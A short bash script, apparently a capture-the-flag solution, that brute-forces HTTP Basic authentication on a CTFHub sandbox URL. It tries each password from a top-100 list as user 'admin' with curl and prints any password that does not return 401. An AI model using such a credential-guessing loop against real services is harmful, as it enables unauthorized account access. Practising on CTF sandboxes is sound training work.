echo hello
echo the world

filename="10_million_password_list_top_100.txt"
website="http://challenge-99f067a693717bcc.sandbox.ctfhub.com:10800/flag.html"
linenum=1

while IFS= read -r line; do
    ((linenum++))

    status_code=$(curl -u "admin:$line" -s -o  /dev/null -w "%{http_code}" "$website")

    if [ "$status_code" != "401" ]; then
        curl -u admin:$line -s $website
        echo "$linenum行内容:$line"
    fi
done < "$filename"
